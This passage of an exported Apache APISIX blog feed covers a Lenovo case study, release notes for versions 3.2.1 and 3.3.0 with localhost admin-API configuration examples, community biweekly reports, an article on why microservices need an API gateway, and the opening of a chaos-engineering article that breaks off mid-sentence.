flexibility of deploying API by scenarios.**\\n\\nEach business scenario can benefit from independent API routing and customized security policies, which provide complete isolation between different scenarios. This enables each business scenario to perform API changes and start-stop operations according to specific plans.\\n\\nSo far, **more than 100 low-code business applications have leveraged this lightweight API gateway component architecture, which has enhanced their performance and resilience** without being hampered by the unified gateway operation and maintenance challenges. This lightweight API gateway component architecture is projected to encompass most of the business scenarios in the next 2 to 3 years.\\n\\n### Realized Full API Lifecycle Management\\n\\n**Centralized API Dev Portal enables API providers to efficiently manage the full API lifecycle in a unified manner for all gateways.**\\n\\nUtilizing an API Dev Portal to manage API information can effectively prevent various business teams from duplicating their API admin tools. Additionally, it enables the possibility of establishing unified API technical standards, documentation standards, and security standards. To integrate complex heterogeneous systems or legacy systems from different business domains, the API Dev Portal also provides various [authorization](https://api7.ai/blog/apisix-permission-policy) processes extended from the APISIX plugin for the backend services of APIs, such as Basic Authorization, oAuth2, Customized Header, and so on. So far, **100+ developers are using the API Dev Portal for API management**.\\n\\n### Provided Unified API Management Marketplace\\n\\nAPI Marketplaces, such as the one facilitated by APISIX, play a vital role in simplifying the process of finding the required APIs for developers. These marketplaces also facilitate efficient sharing and discovery of API information across departments in large enterprises, thereby reducing the time spent on searching for APIs.\\n\\nCurrently, **the API market is already being leveraged by over 1000 developers from various business domains to search and access the necessary API information**. It has proven to be an indispensable tool for streamlining the development process and ensuring access to the most up-to-date and accurate API information.\\n\\nAs APISIX continues to expand its functionality and coverage within the API market, more developers are expected to rely on it as a valuable resource for their development needs. **APISIX provides developers with a centralized platform to search for and access the APIs they require, significantly saving them time and effort during the development process.** Furthermore, the API market powered by APISIX offers developers a collaborative environment to share their own APIs, fostering innovation and collaboration within the development community.\\n\\n### Achieved Enhanced Monitoring\\n\\nAPI Analytics and [Monitoring](https://api7.ai/blog/apache-apisix-datadog-integration) provides businesses with valuable insights into the performance of their APIs. **APISIX plays a crucial role in assisting Lenovo in monitoring its platforms, enabling developers to optimize APIs for enhanced performance, scalability, and reliability.** Additionally, it aids in the early detection of potential risks, such as errors and latency, preventing them from becoming significant problems.\\n\\n## Summary and Outlook\\n\\nI believe that the combination of a high-performance tech stack and a flexible open-source architecture empowers organizations, including ours, to create robust and efficient solutions. This powerful combination equips us with the necessary tools and capabilities to tackle complex challenges and deliver exceptional outcomes.\\n\\nConsidering these remarkable capabilities, we at Lenovo have immense confidence in APISIX and its vibrant community. With the unwavering support of APISIX, we are in a favorable position to achieve remarkable milestones and maintain our leadership in technological advancements within the industry. By leveraging the strengths of APISIX, we can drive innovation, foster growth, and continue to lead the way in delivering cutting-edge solutions that cater to the evolving needs of the market."},{"id":"Release Apache APISIX 3.2.1","metadata":{"permalink":"/blog/2023/06/01/release-apache-apisix-3.2.1","source":"@site/blog/2023/06/01/release-apache-apisix-3.2.1.md","title":"Release Apache APISIX 3.2.1","description":"The Apache APISIX 3.2.1 version is officially released on May 30. This version provides better user experience.","date":"2023-06-01T00:00:00.000Z","formattedDate":"June 1, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":0.605,"truncated":true,"authors":[{"name":"Yuanhao Zeng","title":"Author","url":"https://github.com/leslie-tsang","image_url":"https://avatars.githubusercontent.com/u/59061168?v=4","imageURL":"https://avatars.githubusercontent.com/u/59061168?v=4"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://avatars.githubusercontent.com/u/114121331?v=4","imageURL":"https://avatars.githubusercontent.com/u/114121331?v=4"}],"prevItem":{"title":"APISIX Boosts Lenovo to Build Lightweight and Decentralized Gateway","permalink":"/blog/2023/06/02/lenovo-uses-apisix"},"nextItem":{"title":"Biweekly Report (May 08 - May 22)","permalink":"/blog/2023/05/24/weekly-report-0524"}},"content":"> APISIX 3.2.1 version is officially released, fixing many bugs and improving user experience.\\n\x3c!--truncate--\x3e\\n\\n## bugfix\\n\\n- Fix invalid cache in `core.request.add_header` [#8824](https://github.com/apache/apisix/pull/8824)\\n   > Provide a new implementation to avoid the problem that nginx built-in header variable cache is not refreshed\\n\\n- Fix etcd data synchronization exception [#8493](https://github.com/apache/apisix/pull/8493)\\n\\n- Fix high CPU usage and memory usage caused by healthcheck [#9016](https://github.com/apache/apisix/pull/9016)\\n   > Fix healthchecker leak problem created by `healthcheck.new` in create_checker if APISIX fails after `cancel_clean_handler`\\n\\n- Prevent non-`127.0.0.0/24` requests from accessing Admin API with empty admin_key [#9146](https://github.com/apache/apisix/pull/9146)\\n\\n- Fix the problem of batch-requests not reading trailer headers [#9289](https://github.com/apache/apisix/pull/9289)\\n\\nIf you are interested in the complete update details of the new release, please refer to the [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#bugfixes) of the 3.2.1 release."},{"id":"Biweekly Report (May 08 - May 22)","metadata":{"permalink":"/blog/2023/05/24/weekly-report-0524","source":"@site/blog/2023/05/24/weekly-report-0524.md","title":"Biweekly Report (May 08 - May 22)","description":"The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.","date":"2023-05-24T00:00:00.000Z","formattedDate":"May 24, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.2,"truncated":true,"authors":[],"prevItem":{"title":"Release Apache APISIX 3.2.1","permalink":"/blog/2023/06/01/release-apache-apisix-3.2.1"},"nextItem":{"title":"Why Do Microservices Need an API Gateway","permalink":"/blog/2023/05/19/why-do-microservices-need-an-api-gateway"}},"content":"> From 5.08 to 5.22, 24 contributors submitted 44 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\nWe have also sorted out some issues for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/07/21/KnJsEu03_0508-0522.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/05/26/nrrzBEPe_Untitled%20%281%29.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Proxy-mirror plugin provides support for grpc and grpcs traffic proxying](https://github.com/apache/apisix/pull/9388) (contributor: [Sn0rt](https://github.com/Sn0rt))\\n\\n- [Reuse etcd connections to improve etcd read-write throughput](https://github.com/apache/apisix/pull/9420)(contributor: [kingluo](https://github.com/kingluo))\\n\\n### Apache APISIX Ingress Controller\\n\\n- [Apache APISIX Ingress Controller project removes support for custom resources in version v2beta3](https://github.com/apache/apisix-ingress-controller/pull/1817) (contributor: [tao12345666333](https://github.com/tao12345666333))\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Why Do Microservices Need an API Gateway","metadata":{"permalink":"/blog/2023/05/19/why-do-microservices-need-an-api-gateway","source":"@site/blog/2023/05/19/why-do-microservices-need-an-api-gateway.md","title":"Why Do Microservices Need an API Gateway","description":"Let\'s learn the importance of API gateway in the microservices architecture, and compare common API gateways.","date":"2023-05-19T00:00:00.000Z","formattedDate":"May 19, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":9.315,"truncated":true,"authors":[{"name":"API7.ai","title":"Author","url":"https://github.com/api7","image_url":"https://avatars.githubusercontent.com/u/61078451?s=200&v=4","imageURL":"https://avatars.githubusercontent.com/u/61078451?s=200&v=4"}],"prevItem":{"title":"Biweekly Report (May 08 - May 22)","permalink":"/blog/2023/05/24/weekly-report-0524"},"nextItem":{"title":"Biweekly Report (Apr 24 - May 07)","permalink":"/blog/2023/05/12/weekly-report-0512"}},"content":">The microservices architecture has been widely adopted by many companies. As the data and API quantity of microservices increases, it is crucial to choose an excellent API gateway for high-traffic governance: APISIX.\\n\x3c!--truncate--\x3e\\n\\n## What Are Microservices\\n\\nMicroservice architecture, usually referred to as [microservices](https://api7.ai/blog/what-are-microservices), is a type of architecture used to develop applications. With microservices, large applications can be broken down into multiple independent components, each with its own responsibilities. When processing a user request, an application based on microservices may call many internal microservices to generate its response jointly. Microservices are a result of internet development, and the rapid growth of internet has caused the architecture of systems to change constantly.\\n\\nOverall, the architecture of systems has roughly evolved from monolithic architecture to SOA architecture to microservice architecture. The specific progression and pros/cons of each architecture are outlined in the table below.\\n\\n| Architecture Type | Description                                                                                                                      | Advantages                                                                                                                                                                      | Disadvantages                                                                                                         |\\n|----|-------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------|\\n| Monolithic Application Architecture   |    Pack all functional code into a single service.  | 1. Simple architecture with low project development and maintenance costs.                                                                                                                                                | Coupling all modules together is beneficial for developing and maintaining small projects, but it can create issues for large projects, including <br/> 1. The modules in the project are too tightly coupled, and a performance issue in one module may cause the entire project to become unavailable;<br/> 2. The project needs better scalability. |\\n|    [SOA Architecture](https://en.wikipedia.org/wiki/Service-oriented_architecture)      |   The term stands for \\"service-oriented architecture,\\" which typically involves multiple services. <br/>A service typically exists independently in an operating system process, and communication between services is achieved through dependencies or communication mechanisms, <br/> Ultimately, it provides a series of functions.                                                                                                                                      | 1. System integration: From a systemic perspective, it resolves communication issues between enterprise systems by converting their previously disordered and unstructured network connections into a managed and structured star configuration.<br/> 2. Service-oriented system: From a functional perspective, it abstracts business logic into reusable and combinable services and uses service orchestration to achieve the rapid reconstruction of business processes.<br/> 3. Business service-oriented: From the perspective of the enterprise, it abstracts enterprise functions into reusable and combinable services. | 1. Centralizing services creates dependencies between services, and a malfunction in one service can trigger a cascading failure across other services. <br/> 2. The dependencies and invocation relationships between services are complex, making testing and deployment difficult.                             |\\n|      Microservice Architecture          |    Microservices are the sublimation of SOA. One of the key emphases of the microservices architecture is \\"the need to thoroughly componentize and serviceize business\\", <br/>The original single business system will be split into multiple parts that can be developed, designed, and deployed independently.<br/>These parts will run as small, independent applications. Each application will collaborate and communicate with the others to achieve integration and interactivity, which is the essence of a microservices architecture.                                                                                                                                                                                                                        | 1. Decentralization;<br/> 2. Componentization achieved through services;<br/> 3. Dividing services and development teams based on business capabilities;<br/> 4. Infrastructure automation (DevOps, automated deployment).                                                                                    | 1. The development cost is relatively high;<br/> 2. Cause fault tolerance issues for services; <br/> 3. Cause data consistency issues\uff1b<br/> 4. Involve distributed transactions\\n\\nTherefore, microservices are an inevitable result of Internet development, and the system architecture of many traditional companies is gradually becoming microservice-oriented.\\n\\nHowever, with Internet business development, the number of APIs is also increasing dramatically, and gateways for unified API management will also face challenges. Choosing a more robust API gateway can effectively enhance the system\'s capabilities in monitoring, disaster recovery, authentication, and rate limiting.\\n\\n## What Is an API Gateway?\\n\\nAPI gateway provides a unified interface for interactions between clients and service systems and serves as a central point for managing requests and responses. Choosing a suitable API gateway can simplify development and improve system operation and management efficiency.\\n\\nIn a microservices architecture, an API gateway serves as a solution for system design by integrating various microservices from different modules and coordinating services in a unified manner.\\n\\nAs a system access aspect, the API gateway provides a unified entry point for clients, hides the implementation details of the system architecture, and makes microservices more user-friendly. It also integrates some common features such as [authentication](https://api7.ai/blog/api-gateway-authentication), [rate limiting](https://api7.ai/blog/rate-limiting-in-api-management), and circuit breaking to avoid individual development of each microservice, improve efficiency, and standardize the system, such as identity authentication, monitoring, load balancing, rate limiting, degradation, and application detection.\\n\\n## Why Do Microservices Need an API Gateway?\\n\\n![API gateway in microservices](https://static.apiseven.com/uploads/2023/02/16/IQnuGi7N_111.jpg)\\n\\nAs shown in the above diagram, the API gateway serves as an intermediate layer between the client and microservices. It can provide microservices to the outside world at a unified address and route the traffic to the correct service nodes within the internal cluster based on appropriate rules.\\n\\nWithout an API gateway, the inlets and outlets of the traffic are not unified, and the client needs to know the access information of all services. The significance of microservices will not exist. Therefore, a microservices gateway is necessary for a microservice architecture. Additionally, the API gateway plays a vital role in system observability, identity authentication, stability, and [service discovery](https://api7.ai/blog/what-is-service-discovery-in-microservices).\\n\\n### Challenges Faced by Microservices\\n\\nThe microservices gateway should first have API routing capabilities. As the number of microservices increases, so does the number of APIs. The gateway can also be used as a traffic filter in specific scenarios to provide certain optional features. Therefore, higher demands are placed on the microservices API gateway, such as:\\n\\n- Observability: In the past, troubleshooting in monolithic applications was often done by checking logs for error messages and exception stacks. However, in a microservices architecture with many services, problem diagnosis becomes very difficult. Therefore, how to monitor the operation of microservices and provide rapid alarms when anomalies occur poses a great challenge to developers.\\n- Authentication and Authorization: In a microservices architecture, an application is divided into several micro-applications, which need to authenticate access and be aware of the current user and their permissions.The [authentication](https://api7.ai/blog/understanding-microservices-authentication-services) method in monolithic application architecture is unsuitable, especially when access is not only from a browser but also from other service calls. In a microservices architecture, various authentication scenarios must be considered, including external application access, user-service authentication, and service-service authentication.\\n- System stability: If the number of requests exceeds the processing capacity of a microservice, it may overwhelm the service, even causing a cascading effect that affects the system\'s overall stability.\\n- Service discovery: The decentralized management of microservices also presents challenges for implementing load balancing.\\n\\n### Solutions\\n\\nAPI gateway, as the intermediate bridge between the client and the server, provides a unified management mechanism for the microservices system. In addition to basic functions such as request distribution, API management, and conditional routing, it also includes identity authentication, monitoring and alarm, tracing analysis, load balancing, rate limiting, isolation, and circuit breaking.\\n\\n**Identity authentication**: The following diagram illustrates how microservices are united with an API gateway for identity authentication, where all requests go through the gateway, effectively hiding the microservices.\\n\\n![API gateway authentication in microservices](https://static.apiseven.com/uploads/2023/02/16/zk9D3gB5_222.jpg)\\n\\n**Monitoring and Alerting/Tracing Analysis**:\\n\\nAs the intermediary between the client and server, the API gateway is an excellent carrier for monitoring microservices.\\n\\nThe primary responsibility of the API gateway\'s monitoring function is to detect connection anomalies between the gateway and the backend servers in a timely manner. Users can view log information, monitoring information, tracing, etc. on the monitoring platform for the API. Furthermore, any anomalies that arise on the host will be automatically reported to the control panel. Specific gateways can issue dual alerts to both the client and server.\\n\\n![Monitoring and Tracing Analysis Diagram](https://static.apiseven.com/uploads/2023/02/16/s0CwNZmu_333.jpeg)\\n\\n**Rate limiting, isolation, and circuit breaking**:\\n\\nAs the scale of internet businesses continues to increase, so does the concurrency of systems. Multiple services are often called by each other, and a core link may call up to ten services. If the RT (response time) of a certain service rises sharply and upstream services continue to request, a vicious cycle will occur. The more upstream waiting for results, the more upstream services will be blocked, and the entire process will eventually become unusable, leading to a service avalanche.\\n\\nTherefore, it is necessary to regulate and manage the incoming traffic. The following diagram shows how microservice systems combine API gateways to perform rate limiting, isolation, and circuit breaking.\\n\\n![Rate limiting, isolation, and circuit breaking](https://static.apiseven.com/uploads/2023/02/16/6IssHFUK_444.jpg)\\n\\n### Selection of Mainstream Gateways\\n\\nMany open-source gateway implementations are available in microservices, including NGINX, Kong, Apache APISIX, and Envoy. For the Java technology stack, there are options such as Netflix Zuul, Spring Cloud Gateway, Soul, etc. But you may wonder, \\"[Why would you choose Apache APISIX instead of NGINX and Kong](https://api7.ai/blog/why-choose-apisix-instead-of-nginx-or-kong)?\\"\\n\\nHere\'s a brief comparison.\\n\\n| Gateway | Painpoints                                                                                                                      | Advantages                                                                                                          |\\n|---|------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------|\\n| [NGINX](https://www.nginx.com/) | 1. Reloading is required for changes to take effect in the configuration, which can\'t keep pace with the progress of cloud-native technologies.                                                                                                   | 1. old-style applications;<br/> 2. Stable, reliable, and time-tested; <br/> 3. High Performance                                                                                                                |\\n| [Apache APISIX](https://apisix.apache.org/) | 1. The documentation is not rich or clear enough and needs improvement.                                                                                                                | 1. Apache Foundation Top-Level Project;<br/> 2. The technical architecture is more in line with cloud-native principles;<br/> 3. Excellent performance;<br/> 4. Rich ecosystem;<br/> 5. In addition to supporting Lua development plugins, it also supports language plugins for Java, Go, Python, Node, and others.                                          |\\n| [Kong](https://konghq.com/) | 1. The default use of PostgreSQL or Cassandra databases makes the entire architecture very bloated and can bring about high availability issues;<br/> 2. The routing uses a traversal search algorithm, which can lead to a significant decrease in performance when there are more than thousands of routes in the gateway;<br/> 3. Some important features require payment; | 1. The pioneer of open-source API gateways with a large user base;<br/> 2. Performance meets the needs of most users;<br/> 3. Rich ecosystem;<br/> 4. It supports Lua and Go plugin development;                                                    |\\n|   [Envoy](https://envoy.com/)   | 1. It is developed in C++, which makes it difficult for secondary development;<br/> 2. In addition to developing filters with C++, it also supports WASM and Lua.                                                              | 1. The CNCF graduated project is more suitable for service mesh scenarios and supports the deployment of multi-language architectures;                                                                                                      |\\n|     [Spring Cloud Gateway](https://cloud.spring.io/spring-cloud-gateway/reference/html/)      | 1. Although the Spring community is mature, there is a lack of resources for Gateway.                                                                                                  | 1. The gateway provides a wealth of out-of-the-box features, which can be used through SpringBoot configuration or hand-coded calls; <br/> 2. Spring framework is highly extensible with strong scalability, easy configuration, and good maintainability;    <br/> 3. The Spring community is mature; <br/> 4. Easy to use;<br/> 5. Convenient for the Java technology stack. |\\n\\n## Summary\\n\\nAs the internet world continues to develop, enterprises rapidly evolve, leading to constant changes in system architecture. The microservices architecture has been widely adopted by many companies.\\n\\nAs the data and API quantity of microservices increases, it is crucial to choose an excellent API gateway for high-traffic governance.\\n\\nThis article compares common API gateways, highlighting their respective advantages and disadvantages. Suppose you are in the process of selecting an API gateway technology, encountering performance issues in your microservice system, or looking to build an efficient and stable microservice system. In that case, this article aims to provide you with some helpful insights."},{"id":"Biweekly Report (Apr 24 - May 07)","metadata":{"permalink":"/blog/2023/05/12/weekly-report-0512","source":"@site/blog/2023/05/12/weekly-report-0512.md","title":"Biweekly Report (Apr 24 - May 07)","description":"The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.","date":"2023-05-12T00:00:00.000Z","formattedDate":"May 12, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.11,"truncated":true,"authors":[],"prevItem":{"title":"Why Do Microservices Need an API Gateway","permalink":"/blog/2023/05/19/why-do-microservices-need-an-api-gateway"},"nextItem":{"title":"Release Apache APISIX 3.3.0","permalink":"/blog/2023/05/08/release-apache-apisix-3.3.0"}},"content":"> From 4.24 to 5.07, 20 contributors submitted 28 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/05/12/E6TtjF4h_%E5%85%A8%E9%83%A8%E8%B4%A1%E7%8C%AE%E8%80%85%E6%B5%B7%E6%8A%A5.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/07/21/iFKhb0Do_%E6%96%B0%E6%99%8B%E8%B4%A1%E7%8C%AE%E8%80%85%E6%B5%B7%E6%8A%A5%20%282%29.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Forward-auth plugin supports service degradation feature](https://github.com/apache/apisix/pull/9345)\uff08Contributor\uff1a[shreemaan-abhishek](https://github.com/shreemaan-abhishek)\uff09\\n\\n- [Support skipping mTLS authentication through whitelist](https://github.com/apache/apisix/pull/9322)\uff08Contributor\uff1a[kingluo](https://github.com/kingluo)\uff09\\n\\n- [Proxy-rewrite plugin supports multiple regex rewrite rules](https://github.com/apache/apisix/pull/9194)\uff08Contributor\uff1a[fengxsong](https://github.com/fengxsong)\uff09\\n\\n## Recent Blog Recommendations\\n\\n- [Release Apache APISIX 3.3.0](https://apisix.apache.org/blog/2023/05/08/release-apache-apisix-3.3.0/)\\n\\n  The Apache APISIX 3.3.0 version is officially released. This version provides better performance in multi-domain matching scenarios.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Release Apache APISIX 3.3.0","metadata":{"permalink":"/blog/2023/05/08/release-apache-apisix-3.3.0","source":"@site/blog/2023/05/08/release-apache-apisix-3.3.0.md","title":"Release Apache APISIX 3.3.0","description":"The Apache APISIX 3.3.0 version is officially released on April 30. This version provides better performance in multi-domain matching scenarios.","date":"2023-05-08T00:00:00.000Z","formattedDate":"May 8, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.855,"truncated":true,"authors":[{"name":"Yuanhao Zeng","title":"Author","url":"https://github.com/leslie-tsang","image_url":"https://avatars.githubusercontent.com/u/59061168?v=4","imageURL":"https://avatars.githubusercontent.com/u/59061168?v=4"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://avatars.githubusercontent.com/u/114121331?v=4","imageURL":"https://avatars.githubusercontent.com/u/114121331?v=4"}],"prevItem":{"title":"Biweekly Report (Apr 24 - May 07)","permalink":"/blog/2023/05/12/weekly-report-0512"},"nextItem":{"title":"Building a More Robust Apache APISIX Ingress Controller With Litmus Chaos","permalink":"/blog/2023/05/04/apache-apisix-chaos-engineering"}},"content":"> The Apache APISIX 3.3.0 version is officially released. This version provides better performance in multi-domain matching scenarios.\\n\\n\x3c!--truncate--\x3e\\n\\n## APISIX 3.3.0 New Features\\n\\nAfter a month, the new version came again. APISIX 3.3.0 is the first new version since the LTS version 3.2.0. In the new era of 3.x, we will continue to provide you with more new features.\\n\\nThe version 3.3.0 changes the default route matching mode from `radixtree_uri` to `radixtree_host_uri`, which provides better performance in multi-domain matching scenarios. As usual, many features are added to optimize the experience of using APISIX.\\n\\n## New Features\\n\\n### Support for storing routing certificates in secrets manager\\n\\nAPISIX 3.3.0 version supports loading certificates from Vault, which provides better security guarantees.\\n\\nStep 1: Configure Vault Parameters\\n\\n```\\n$ curl http://127.0.0.1:9180/apisix/admin/secrets/vault/test1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n{\\n    \\"uri\\": \\"http://127.0.0.1:8200\\",\\n    \\"prefix\\": \\"kv/apisix\\",\\n    \\"token\\" : \\"root\\"\\n}\'\\n```\\n\\nStep 2: Use `$secret://` syntax on the SSL object to refer to the configuration of the vault-related path, and APISIX will obtain the relevant certificate from the corresponding vault resource path.\\n\\n```\\n$ curl http://127.0.0.1:9180/apisix/admin/ssls/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \'\\n{\\n    \\"cert\\": \\"$secret://vault/test1/ssl/test2.com.crt\\",\\n    \\"key\\": \\"$secret://vault/test1/ssl/test2.com.key\\",\\n    \\"sni\\": \\"test2.com\\"\\n}\'\\n```\\n\\nFinally, configure the above SSL object on the specific route, and the route certificate can be loaded from the vault.\\n\\n### Support for bypassing Admin API authentication via configuration\\n\\nBy default, APISIX will check `X-API-KEY`, now you can turn off the `admin_key_required` configuration item in the configuration file to turn off related checks.\\n\\nStep 1: Modify the config.yaml configuration file\\n\\n```\\n...\\ndeployment:\\n  admin:\\n    admin_key_required: false\\n...\\n```\\n\\nStep 2: Access resources without using admin key\\n\\n```\\ncurl -v http://127.0.0.1:9180/apisix/admin/routes\\n```\\n\\nIn this way, the complexity of development and debugging can be simplified.\\n\\n### Optimization and more small features\\n\\nIn addition to the several major features mentioned above, this release also includes many changes worth mentioning:\\n\\n* Support request header injection in fault-injection plugin\\n* Provide support for referencing variables captured by route rewrite in proxy-rewrite plugin in other plugins\\n* The limit-count plugin provides username and ssl redis authentication methods\\n\\nIf you are interested in the complete update details of the new release, please refer to the [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#330) of the 3.3.0 release."},{"id":"Building a More Robust Apache APISIX Ingress Controller With Litmus Chaos","metadata":{"permalink":"/blog/2023/05/04/apache-apisix-chaos-engineering","source":"@site/blog/2023/05/04/apache-apisix-chaos-engineering.md","title":"Building a More Robust Apache APISIX Ingress Controller With Litmus Chaos","description":"Chaos engineering is a powerful tool for ensuring system reliability and performance, and its application in designing Chaos experiments for Ingress Controllers can help organizations identify weaknesses in their applications and infrastructure.","date":"2023-05-04T00:00:00.000Z","formattedDate":"May 4, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":8.47,"truncated":true,"authors":[{"name":"API7.ai","title":"Author","url":"https://github.com/api7","image_url":"https://avatars.githubusercontent.com/u/61078451?s=200&v=4","imageURL":"https://avatars.githubusercontent.com/u/61078451?s=200&v=4"}],"prevItem":{"title":"Release Apache APISIX 3.3.0","permalink":"/blog/2023/05/08/release-apache-apisix-3.3.0"},"nextItem":{"title":"Biweekly Report (Apr 10 - Apr 23)","permalink":"/blog/2023/04/26/weekly-report-0426"}},"content":">Chaos engineering is a powerful tool for ensuring system reliability and performance, and its application in designing Chaos experiments for Ingress Controllers can help organizations identify weaknesses in their applications and infrastructure.\\n\x3c!--truncate--\x3e\\n\\n## Overview\\n\\n[Chaos Engineering](https://en.wikipedia.org/wiki/Chaos_engineering) plays a crucial role in assessing and enhancing the resilience and reliability of software systems. By simulating disruptive events, organizations can identify vulnerabilities and improve the system\'s design and architecture. In this article, we will discuss the importance of Chaos Engineering and its specific application in designing Chaos experiments for Ingress Controllers.\\n\\n## Why We Need Chaos Engineering?\\n\\nChaos Engineering is the process of evaluating software systems by simulating destructive events, such as server network outages or API throttling. By introducing chaos or faults within the system, we can test the system\'s resilience and reliability in unstable and unexpected conditions.\\n\\nChaos Engineering helps teams identify hidden risks, monitor vulnerabilities, and identify performance bottlenecks in distributed systems by simulating real-world scenarios in a secure control environment. This approach effectively prevents system downtime or production interruptions.\\n\\nNetflix\'s approach to handling systems inspired us to adopt a more scientific approach, which drove the birth and development of Chaos Engineering.\\n\\n**1. Introduction of Disruptive Events**\\n\\nChaos Engineering involves introducing disruptive events, such as network partitions, service degradation, and resource constraints, to simulate real-world scenarios and test the system\'s ability to handle unexpected conditions. The purpose is to identify vulnerabilities or weaknesses and improve the system\'s design and architecture to make it more robust and resilient.\\n\\n**2. Testing System Resilience**\\n\\nIn today\'s constantly evolving and fast-paced technology landscape, testing system resilience is crucial to ensure that systems are robust, scalable, and capable of handling unexpected challenges and conditions. Chaos Engineering is an effective way to achieve this by introducing disruptive events to observe the system\'s response and measure its ability to handle unexpected conditions.\\n\\nOrganizations can monitor system logs, performance metrics, and user experience to measure the impact of disruptive events on system resilience. Tracking these metrics provides a better understanding of the system\'s behavior, allowing organizations to identify areas for improvement.\\n\\n**3. Discovering Hidden Problems**\\n\\nDistributed systems are prone to hidden issues, such as data loss, performance bottlenecks, and communication errors, which can be challenging to detect, as they may only become visible when the system is under pressure. Chaos Engineering can help uncover these hidden issues by introducing disruptive events. This information can then be used to improve the system\'s design and architecture, making it more resilient and reliable.\\n\\nProactively identifying and resolving these problems enhances the reliability and performance of systems, preventing downtime, reducing the risk of data loss, and ensuring the system runs smoothly.\\n\\n**4. What It\'s Worth and Why We Need It?**\\n\\nDistributed systems are complex and inherently chaotic, which can lead to failure. The use of cloud and [microservices](https://api7.ai/blog/what-are-microservices) architecture provides many advantages but also comes with complexity and chaos. Engineers are responsible for making the system as reliable as possible.\\n\\nWithout testing, there is no confidence to use the project in the production environment. In addition to conventional unit tests and end-to-end tests, introducing chaos tests makes the system more robust.\\n\\nWhen an error occurs, repairing it takes time and can cause immeasurable losses, with long-term effects in the future. During the repair process, various factors need consideration, including the system\'s complexity, the type of error, and possible new problems, to ensure effective final repair.\\n\\nFurthermore, when an open-source project brings serious faults to users in the production environment, many users may switch to other products.\\n\\n## How to Design Chaos Experiments for an Ingress Controller?\\n\\n**1. What Is Ingress?**\\n\\nIngress is a Kubernetes resource object that contains rules for how external clients can access services within the cluster. These rules dictate which clients can access which services, how client requests are routed to the appropriate services, and how client requests are handled.\\n\\n**2. What Is an Ingress Controller?**\\n\\nAn Ingress resource requires an Ingress Controller to process it. The controller translates the Ingress rules into configurations on a proxy, allowing external clients to access services within the cluster. In a production environment, Ingress Controllers need to have complex capabilities, such as limiting access sources and request methods, [authentication](https://api7.ai/blog/api-gateway-authentication), and authorization. Most Ingress Controllers extend the semantics of Ingress through annotations in the Ingress resource.\\n\\n**3. What Is Apache APISIX Ingress Controller?**\\n\\nApache APISIX Ingress Controller is a specialized type of load balancer that helps administrators manage and control Ingress traffic. It uses APISIX as a data plane to provide users with [dynamic routing](https://api7.ai/blog/dynamic-routing-based-on-user-credentials), load balancing, elastic scaling, security policies, and other features to improve network control and ensure higher availability and security for their business. APISIX Ingress Controller supports three configuration modes: Kubernetes Ingress, custom resources, and Gateway API.\\n\\n![APISIX-Ingress](https://static.apiseven.com/uploads/2023/04/25/0NSCMh9X_APISIX-Ingress-2.png)\\n\\n**4. What Is Litmus Chaos?**\\n\\n[Litmus Chaos](https://litmuschaos.io/) is an open-source Chaos Engineering framework that provides an infrastructure experimental framework to validate the stability of controllers and microservices architectures. It can simulate various environments, such as container-level and application-level environments, natural disasters, faults, and upgrades, to understand how the system responds to these changes. The framework can also explore the behavior changes between controllers and applications, and how controllers respond to challenges in specific states. Litmus Chaos offers convenient observability integration capabilities and is highly extensible.\\n\\n**5. How to Design Chaos Experiments?**\\n\\nHere is a general procedure for designing chaos experiments in any scenario:\\n\\n- 